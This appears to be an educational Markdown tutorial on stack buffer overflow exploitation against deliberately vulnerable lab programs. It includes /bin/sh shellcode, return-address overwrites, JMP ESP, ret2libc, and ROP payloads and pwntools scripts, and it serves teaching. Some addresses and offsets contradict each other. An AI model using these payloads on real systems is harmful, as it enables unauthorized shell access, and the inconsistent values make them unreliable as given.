# Exploitation


## Buffer Overflow

### What it is
A **buffer overflow** happens when a program copies more data into a buffer than it can store.
If the buffer is on the stack, the extra bytes can overwrite important data like the **saved return address**.


### Example 1: x86 overflow

With this example:  
  
```
void callit (char *name) {
	int value;
	char buffer[500];
	
	value = 0;	
	strcpy (buffer, name);
	printf ("-------------------\n");
	printf ("Value : \t%p [%d]\n", &value, value);	
	printf ("Buffer in: \t%p\n", buffer);
	printf ("Address of function success2: %p\n", success2); 	
	printf ("-------------------\n");
	if (value==3) {
		 success();
	}
	else {
		printf ("[!] No success\n"); 
	}
	value = 0; 
}

``` 
Goal: get value == 3.

1) Change the value of the variable "value" to 3:
```
./vuln `perl -e 'print "A"x500 . "\x03"'` 
```

2) Execute the function success2. Find the value of the pointer to the function success2 using gdb:

    `(gdb) print success2`
	      
	` $1 = {int ()} 0x8049339 <success2>0x8049339`

3) Find the position of the Saved EIP with gdb --> offset of 516 bytes. Compute the offset:

  ``` 
gdb -q vuln 
break callit
run AAAA
print $rbp or $ebp
x/x buffer
offset = print /d <rbp> - <buf> + 8(64)/4(32)
----------------
gef➤  print $ebp
$1 = (void *) 0xffffce48
gef➤  x/x buffer
0xffffcc48:     0x00000007
gef➤  print /d 0xffffce48-0xffffcc48+4
$2 = 516
  ```

4) Overflow the Saved EIP.
``` 
./vuln `perl -e 'print "A"x500 . "B"x16 . "\x39\x93\x04\x08"'`

./vuln $(python -c 'import sys; sys.stdout.buffer.write (b"A"*500 + b"B"*16 + b"\x39\x93\x04\x08")')
```

5) Execute a shellcode that launches /bin/sh:

    Shellcode (25 bytes): execve("/bin/sh", ["/bin/sh"], 0)

    In hex: `"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"`
       
- Without NOP Sled: 
```
./vuln `perl -e 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x475 . "\x03" . "B"x15 . "\x78\xca\xff\xff" '`  
``` 
"A"x475 -> buffer size = 500 // shellcode size = 25 // 500-25=475 fill until the buffer is full

x03 -> value==3

"B"x15 -> fill the buffer = 500 // write x03 = 1 // 500+1=501 // offset = 516 // 516-501=15

\x78\xca\xff\xff -> dir we want to add in the return address

``` 
./vuln $(python -c 'import sys; sys.stdout.buffer.write (b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + b"A"*475 + b"\x03" + b"B"*15 + b"\x78\xca\xff\xff")')
```

- With NOP Sled
```
./vuln `perl -e 'print "\x90"x70 . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80". "A"x405 . "\x03" . "B"x15 . "\x78\xca\xff\xff" '`'
```
#### JMP ESP technique:  www.exploit-db.com/papers/13232
Avoids having to know the exact position of the buffer. It is similar to the previous one, but in this case we write the payload after the savedEIP and in the savedEIP we call a JMP $ESP instruction.
```	
root@kali:~/# sudo apt install framework2 (installed by the repository install script)
root@kali:~/# /usr/share/framework2/msfelfscan -f ./vuln -j esp 
	0x08049469   jmp esp # look for the location of the jmp esp instruction
```	
Sometimes, this instruction is not found, but we can try to find it interlaced in other instructions, given that jmp $esp is \xff\xe4

The exploitation is: 
``` 
./vuln `perl -e 'print "A"x500 . "B"x16 . "\x69\x94\x04\x08" . "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"'`

./vuln $(python -c 'import sys; sys.stdout.buffer.write (b"A"*500 + b"B"*16 + b"\x69\x94\x04\x08" + b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")')
``` 
#### ret2libc technique. 
The fist step is to get the location of both (in this case) system and /bun/sh:
``` 
(gdb) p system  (note: first set a breakpoint at main and run to load libc)
$1 = {<text variable, no debug info>} 0xf7db94c0 <system>
(gdb) find &system,+9999999,"/bin/sh"
0xf7f30e3c
warning: Unable to access 16000 bytes of target memory at 0xf7faa6b2, halting search.
1 pattern found.
```
With GEF in GDB, you can do:
``` 
gef➤  search-pattern "/bin/sh"
[+] Searching '/bin/sh' in memory
[+] In '/usr/lib32/libc.so.6'(0xf7f16000-0xf7f9b000), permission=r--
	0xf7f30e3c - 0xf7f30e43  →   "/bin/sh"
```


Results obtained: 
	`system:  0xf7db94c0`
	`/bin/sh: 0xf7f30e3c`

Payload to execute: 
```	
./vuln `perl -e 'print "A"x500 . "B"x16 . "\xc0\x94\xdb\xf7" . "AAAA" . "\x3c\x0e\xf3\xf7"'`
``` 
Now, we also include the exit function in the return to avoid segmentation fault:
	`exit: 0xf7da5ac0`
``` 
./vuln `perl -e 'print "A"x500 . "B"x16 . "\xc0\x94\xdb\xf7" . "\xc0\x5a\xda\xf7" . "\x3c\x0e\xf3\xf7"'`
``` 
#### ROP Technique: 
With this technique, /bin/bash will be executed using the functions present in the executable that are not used. They will be executed in a chained manner. 

``` python
# coding: utf-8


# ROP test for the executable vuln1_stack.
#  Chains the functions add_bin, add_bash, and exec_string:
#  add_bin:      0x80493c3  (parameters 0xdeadbeef)
#  add_bash:     0x804940a (parameters: 0xcafebabe, 0x0badf00d)
#  exec_string:  0x8049387
#
#  To find gadgets to chain:
#      $ ropper --file vuln --nocolor | grep ret | grep pop


#   pop ret: 0x08049217
#   pop pop ret: 0x08049216
	
from pwn import * 

# addresses definition 
add_bin = 	0x80493c3
add_bash = 	0x804940a
exec_string = 	0x8049387
pop_ret = 	0x0804947c
pop_pop_ret = 	0x0804947b

# building the stack from lower to high
p = b''
p += b'A' * 500
p += b'B' * 16
p += p32(add_bin)
p += p32(pop_ret)
# pop takes the argument deadbeef // ret %eip = dir add_bash %esp = pop_pop_ret
p += p32(0xdeadbeef)
p += p32(add_bash)
p += p32(pop_pop_ret)
# pop pop takes both arguments // ret %eip = exec_string
p += p32(0xcafebabe)
p += p32(0x0badf00d)
p += p32(exec_string)

proc = process(['./vuln_stack_nx', p])
proc.interactive()

``` 

### Example 2: x64 overflow

Example code:

```c
#include<stdio.h> 
#include<string.h> 

void vuln(char *cadena)
{ 
  char buf[100]; 
  strcpy(buf,cadena); 
  printf("Input was: %s\n",buf); 
}
void main(int argc, char *argv[]) 
{
  vuln(argv[1]);
}
```
The offset is 120 bytes.


#### Searching for Addresses in libc

We need to find the addresses to execute `system ("/bin/sh")`. Since our executable does not contain the call, we inspect libc:

```bash
# ldd vuln
        linux-vdso.so.1 (0x00007ffff7ffd000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7e14000)
        /lib64/ld-linux-x86-64.so.2 (0x0000555555554000)


# objdump -M intel -d /lib/x86_64-linux-gnu/libc.so.6 > dump  # Dump the disassembly (Intel format) into the file dump

# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh  # Search for /bin/sh and find it at offset 0x183cee

 1a7e43 /bin/sh
                                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/bufferoverflow/exercises/stackOverflow/x64]
└─$ cat dump | grep system        
00000000000528f0 <__libc_system@@GLIBC_PRIVATE>:
   528f3:       74 0b                   je     52900 <__libc_system@@GLIBC_PRIVATE+0x10>
0000000000156030 <svcerr_systemerr@GLIBC_2.2.5>:
  156087:       75 05                   jne    15608e <svcerr_systemerr@GLIBC_2.2.5+0x5e>

```

We note the following offsets:

`system:  0x528f0`

`/bin/sh: 0x1a7e43`

Now we add these offsets to the base address where LIBC is loaded (we check it with gdb, since it will not change because ASLR is disabled):

```
root@kali:~/bufferOverflow/stackOverflow/x64# gdb -q vuln
Reading symbols from vuln...done.
gef➤ b main 
Breakpoint 1 at 0x1154: file vuln.c, line 7.
gef➤ run
gef➤  vmmap
[ Legend:  Code | Stack | Heap ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /home/kali/bufferoverflow/exercises/stackOverflow/x64/vuln
0x00007ffff7daf000 0x00007ffff7db2000 0x0000000000000000 rw- 
0x00007ffff7db2000 0x00007ffff7dda000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7dda000 0x00007ffff7f3f000 0x0000000000028000 r-x /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f3f000 0x00007ffff7f95000 0x000000000018d000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f95000 0x00007ffff7f99000 0x00000000001e2000 r-- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f99000 0x00007ffff7f9b000 0x00000000001e6000 rw- /usr/lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7f9b000 0x00007ffff7fa8000 0x0000000000000000 rw- 
0x00007ffff7fc0000 0x00007ffff7fc2000 0x0000000000000000 rw- 
0x00007ffff7fc2000 0x00007ffff7fc6000 0x0000000000000000 r-- [vvar]
0x00007ffff7fc6000 0x00007ffff7fc8000 0x0000000000000000 r-x [vdso]
0x00007ffff7fc8000 0x00007ffff7fc9000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7fc9000 0x00007ffff7ff0000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ff0000 0x00007ffff7ffb000 0x0000000000028000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffb000 0x00007ffff7ffd000 0x0000000000033000 r-- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffff7ffd000 0x00007ffff7fff000 0x0000000000035000 rw- /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]

```


Libc load address:

`libc_base = 0x00007ffff7db2000`

### Finding a Gadget

Finally, we need to find a gadget to load the appropriate parameter into RDI for calling `system`.

Let's use ropper (it's in the install script in the repository):

Now we search for gadgets that are useful for loading the value of `/bin/sh` into RDI:

```
┌──(kali㉿kali)-[~/bufferoverflow/exercises/stackOverflow/x64]
└─$ ropper --file libc.so.6 --nocolor | grep ret | grep -E "pop rdi; ret"                                  
[INFO] Load gadgets for section: LOAD
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
0x000000000002a205: pop rdi; ret;
```

Therefore, we have the offset of the gadget we are looking for:

`offset_pop_rdi = 0x2a205`

### Exploit Development

```python
#!/usr/bin/python3
# coding: utf-8

from pwn import *

# definimos variables 
libc_base = 0x00007ffff7dd9000
system_addr = libc_base + 0x528f0
binsh_addr = libc_base + 0x1a7e43
pop_rdi_ret = libc_base + 0x2a205
ret = libc_base + 0x2a206 # el valor de todo (pop + ret) es 205, entonces para obtener el valor de ret, debo sumarle uno a 205.


log.info ("system: " + str(hex(system_addr)))
log.info ("binsh: " + str(hex(binsh_addr)))
log.info ("pop_rdi_ret: " + str(hex(pop_rdi_ret)))

pause()

p = process ("./vuln")

# build the stack
# we need the offset. el offset es el 120. overflow con 120 As.
payload = b""
payload += b"A"*120
# Some functions (e.g., moveaps) require RSP to be aligned to 16 bits. For this reason, since 120 "A"s mean
# that RSP is not aligned to 16 bits (missing 8 bits --> 120/16 = 7.5), here we add a ret instruction
# (which takes 8 bits), so that the stack is aligned to 16 bits (last byte is 0 when calling system)
payload += p64 (ret) # el ret no hace nada. aqui se pone el ret porque cuando llamo a una funcion necesito que este alineada a 16B. como no lo esta necesito quitar los 8B
payload += p64(pop_rdi_ret) # finding a gadget. Estos gadget cogen de la libc. como? mirar la explicacion en el repo
payload += p64(binsh_addr)
payload += p64(system_addr)
	
log.info ("Sending payload...")

p.sendline(payload)
p.recv()
p.interactive()

```










